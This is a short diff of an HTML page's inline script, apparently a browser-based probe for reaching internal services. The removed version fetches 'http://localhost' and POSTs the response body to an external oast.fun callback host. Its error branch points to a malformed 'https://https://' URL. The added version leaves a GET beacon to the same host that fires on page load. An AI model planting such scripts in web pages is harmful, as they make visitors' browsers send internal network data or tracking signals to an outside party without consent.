@@ -5,21 +5,10 @@
 </head>
 <body>
 <script>
-fetch('http://localhost')
-  .then(r => r.text())
-  .then(data => {
+
     fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ data: data })
+      method: 'GET'
     });
-  }).catch(error => {
-    fetch('https://https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ error: error.toString() })
-    });
-  });
 </script>
 </body>
 </html>
